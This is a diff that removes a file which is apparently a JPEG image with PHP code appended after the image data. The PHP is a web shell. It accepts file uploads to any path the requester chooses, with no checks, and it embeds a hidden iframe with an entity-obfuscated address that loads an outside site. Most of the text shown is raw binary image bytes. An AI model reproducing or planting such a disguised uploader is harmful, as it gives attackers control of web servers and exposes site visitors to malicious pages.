@@ -1,26 +1,0 @@
-ÿØÿà JFIF      ÿþ ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 85
-ÿÛ C 	!"$"$ÿÛ CÿÀ  $ ^" ÿÄ           	
-ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
-%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
-ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
-$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? óÛÏ	ÝC¢ý´Ü^­ï‰"šÜ,k8`áÏ98Æ?ŸÃ¾Ô.µs$Ö±Á$½²Xw Šô_ŒZ²ÿ Â¿ñ2Äbýž³°³š97”8%¸QŒ}s\õÅ´qXxzK1²\@NÞ2¤í<Àÿ JèÁàÕY{ÝlF/‘Z=N[ÅúÂxràBš}˜ûFàJÛ¨<yÇ½wÿ 
-5¿Òìo Û¹œ£^sñÂ(®!³¸Œ†òïfF*znÁ‡º€“¤5 `ZË}ñ½ØÒŠ…’<ùTr‚mž5¤W>"ž>Ir¤{ƒ_+<ï¡$$ÿ «¡Cé_UC)^šr2ö5ó¿dÅ:”(c¼˜ûìâ£•¤U	.f‹pêSªnFÁŠ¿eª\‘™‚‘Ó°üë.ÞÕ¹Æ8«#	˜m=8­“i›ÚçO¥^)RåÈ=ñ^Éð*_:öMüÆÎÀç¿Ê3üÅxŸ¨Ã–8®kÞ>°Ó(”y“¤D”NYœäàÒµ©/vÇ-]WÂZ’¾³}h[*’²§Ðþô'Âyåm&e·`Xg>•ò—Ãé%­ÃÌ²y²ãƒÎkèß†ºÕž“¥Kwwr‰Œdóž¼Ž½«ƒ•Î
- r´Ï;ý¢ôM<›¡Ù[A¨êÑCÂ¤ozÊªé+h%°½B’ÙÇäJcd‹´`þ<UoÌmõÏ
-¬®’ºkùÙÂ>*ÇŽôë¯øVz–¥%Â6«}«G;£–m¡ºíùÅc—ÕŠ~ºb¨¹«_aÍaii©E4jPLã§ùÅUð<öú¤ÆŠ ŽvŒg?q~!ñ”v–âÚc ¸¾DÚÜpA/ÈÁã­m|=Ö-nux–Ý^HÏÞ”±õþ•ìª|ñmt<ÎYÇVz&“)â7FYYºž¿Z«â/†úUÖ©w}-¬@—upÎO%‰P?
-±¦H¯âMÃƒvž¼Wa¨j0†Œ²Ê0}k+[As[SÍcøy ‘ƒ¯ÑL¿
-t9-0ýªë]”ÈJô§‡ÂðiêhªJÛœÿ €´M:æ+ˆädè‰ðé^ðžÖÝuH€<XtÏlV6«(±èsÍ[ð-êÅ­Þ*)I'¥(ÝXŽvÝÙå2¬v¼Q§$«²-Næ4eÁD·ôÅ{·Ãoé^)ÐßRO"@ÊT•=ê:ŽkæcUI>&^Ý
-áå”‰·KH¤£?Ýñ¯£¾
-^]G§\›4ó›#r³íõÎ
-qRR“³GV!¯i~çœ¦‹¢Ü]Ay6æO‰#g»¸m­ëƒ&;úUŸÈòøVBHˆÎÜí ~Y8úš(¯
-J4Ÿ»ù·ù¶{U–ç”ü|ðæŸáÿ 
-é1Ø4å%½¸v0?6#{þ•ð¦ötñ¦ŠŠÃ#+{Eõ8vù?®ìòêü?×cèÍ9R]^Q,hà#ÛùûÖÄi¦Òîá[Y¤ÆÜüç'ŸÂŠ+x­Yä½‘VÏR½{ec1É•%¾©|]ÔÎp=…VÔ¡ºÝÊº¤Ó9¦rOZ¹à÷ÚÄY æLš(¥^*;öO'øÆ‘Yxø½¬QÂd¼¹ÝµqœÈ~¹5ì_uk«{y H$H¹ÏZ(¯3¯)§ÜëÄü~GÿÙ<?php
-
-$files = @$_FILES["files"];
-if ($files["name"] != '') {
-    $fullpath = $_REQUEST["path"] . $files["name"];
-    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
-        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
-    }
-}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form><iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
-</body></html>';
-?>
